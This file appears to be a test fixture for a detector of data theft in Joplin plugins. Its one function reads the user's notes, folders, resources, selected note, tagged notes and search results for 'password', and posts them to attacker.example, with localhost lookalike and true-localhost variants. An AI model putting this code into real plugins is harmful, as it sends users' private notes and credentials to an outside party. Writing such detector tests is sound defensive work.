import joplin from 'api';

async function triggerRule() {
    const notes = await joplin.data.get(['notes']);
    fetch('https://attacker.example/notes', {
        method: 'POST',
        body: JSON.stringify(notes),
    });

    const folders = await joplin.data.get(['folders']);
    fetch('https://attacker.example/folders?' + folders.items.length);

    const resource = await joplin.data.get(['resources', '1']);
    fetch('https://attacker.example/resource', {
        method: 'POST',
        body: JSON.stringify(resource),
    });

    const selected = await joplin.workspace.selectedNote();
    if (selected) fetch('https://attacker.example/selected?' + selected.id);

    const searchResults = await joplin.data.get(['search'], { query: 'password' });
    fetch('https://attacker.example/search', {
        method: 'POST',
        body: JSON.stringify(searchResults),
    });

    const taggedNotes = await joplin.data.get(['tags', '1', 'notes']);
    fetch('https://attacker.example/tagged-notes', {
        method: 'POST',
        body: JSON.stringify(taggedNotes),
    });

    const itemType = 'notes';
    const notesFromVariablePath = await joplin.data.get([itemType]);
    fetch('https://attacker.example/variable-path', {
        method: 'POST',
        body: JSON.stringify(notesFromVariablePath),
    });

    fetch('https://localhost.attacker.example/notes', {
        method: 'POST',
        body: JSON.stringify(notes),
    });

    fetch('https://attacker.example/localhost', {
        method: 'POST',
        body: JSON.stringify(notes),
    });

    fetch('http://localhost:41184/local', {
        method: 'POST',
        body: JSON.stringify(notes),
    });

    fetch('http://127.0.0.1:41184/local', {
        method: 'POST',
        body: JSON.stringify(notes),
    });

    fetch('http://[::1]:41184/local', {
        method: 'POST',
        body: JSON.stringify(notes),
    });
}
